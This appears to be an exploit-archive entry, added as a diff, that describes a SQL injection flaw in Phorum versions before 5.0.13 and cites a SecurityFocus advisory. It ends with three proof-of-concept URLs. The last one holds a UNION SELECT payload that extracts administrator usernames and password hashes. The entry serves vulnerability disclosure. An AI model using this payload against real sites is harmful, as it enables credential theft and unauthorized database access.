@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/11660/info
+
+Reportedly Phorum is affected by a remote SQL injection vulnerability. This issue is due to a failure of the application to properly sanitized user supplied URI input.
+
+This issue allows remote attackers to manipulate query logic, leading to unauthorized access to sensitive information such as the user password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.
+
+This issue has been reported to affected versions prior to 5.0.13.
+
+http://www.example.com/phorum5012/follow.php?forum_id=1&,f00=bar,1=waraxe
+http://www.example.com/phorum5012/follow.php?forum_id=1&thread=waraxe
+http://www.example.com/phorum5012/follow.php?forum_id=1&,f00=bar,1=-99%20UNION%20ALL%20SELECT%201%2c1%2c1%2c1%2c1%2cCONCAT(username%2c%27|%27%2cpassword)%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%2c1%20FROM%20phorum_users%20WHERE%20admin=1
